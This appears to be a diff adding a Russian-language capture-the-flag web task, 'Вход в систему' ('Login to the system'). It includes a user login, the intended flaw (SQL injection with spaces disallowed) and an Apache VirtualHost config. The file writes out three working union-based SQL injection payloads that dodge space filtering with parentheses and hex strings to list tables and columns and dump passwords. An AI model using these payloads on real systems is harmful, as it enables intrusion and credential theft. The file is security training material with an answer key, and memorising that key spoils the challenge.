@@ -1,0 +1,42 @@
+##########
+
+Название: Вход в систему
+Сложность: 200
+Категория: web
+
+Описание:
+Наши друзья египтяне попросили нас получить доступ к описанию администратора их египетской системы, но ни логина, ни пароля они не смогли вспомнить...
+Единственное, что им удалось найти на стенах пирамиды Хеопса - это логин и пароль рядового пользователя. 
+Логин: Godemale 
+Пароль: 123
+
+Смысл:
+Sql-injection в которой невозможны пробелы
+
+##########
+
+Три запроса:
+
+?id=(-1)union(select(1),(select(group_concat(table_name))from(information_schema.tables)where(table_schema)!=(0x696e666f726d6174696f6e5f736368656d61)))
+?id=(-1)union(select(1),(select(group_concat(COLUMN_NAME))from(information_schema.columns)where(TABLE_NAME)=(0x676e6f6d)))
+?id=(-1)union(select(1),(SELECT(group_concat(pass))FROM(secret)))
+
+<VirtualHost *:80>
+        #ServerName www.example.com
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /home/log_in_system
+
+        #LogLevel info ssl:warn
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+        <Directory /home/log_in_system>
+                DirectoryIndex index.html
+                Options -Indexes
+                AllowOverride None
+                Require all granted
+        </Directory>
+
+</VirtualHost>
